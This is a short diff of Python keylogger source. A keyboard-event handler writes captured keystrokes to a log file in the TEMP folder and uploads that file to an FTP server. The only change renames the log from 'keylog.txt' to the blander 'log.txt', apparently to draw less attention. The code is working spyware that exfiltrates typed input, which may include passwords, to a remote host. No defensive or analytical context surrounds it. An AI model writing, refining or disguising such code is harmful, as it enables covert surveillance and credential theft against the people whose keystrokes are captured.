@@ -75,7 +75,7 @@ def OnKeyboardEvent(event):
             # connect to ftp server
 
             TMP = os.environ["TEMP"]
-            objLogFile = open(TMP + "/keylog.txt", 'w')
+            objLogFile = open(TMP + "/log.txt", 'w')
             if blnStop == "True":
                 objLogFile.write("\n\n""Keylogger Stopped At: " + time.strftime("%d/%m/%Y") + " " + time.strftime("%I:%M:%S")+"\n\n")
             else:
@@ -84,10 +84,10 @@ def OnKeyboardEvent(event):
             # create log file
 
             arFileList  = ftp.nlst()
-            if "keylog.txt" in arFileList:
-                objLogFile = open(TMP + "/keylog.txt", 'rb'); ftp.storbinary("APPE keylog.txt", objLogFile)
+            if "log.txt" in arFileList:
+                objLogFile = open(TMP + "/log.txt", 'rb'); ftp.storbinary("APPE log.txt", objLogFile)
             else:
-                objLogFile = open(TMP + "/keylog.txt", 'rb'); ftp.storbinary("STOR keylog.txt", objLogFile)
+                objLogFile = open(TMP + "/log.txt", 'rb'); ftp.storbinary("STOR log.txt", objLogFile)
             objLogFile.close()
             # send log file
         except:
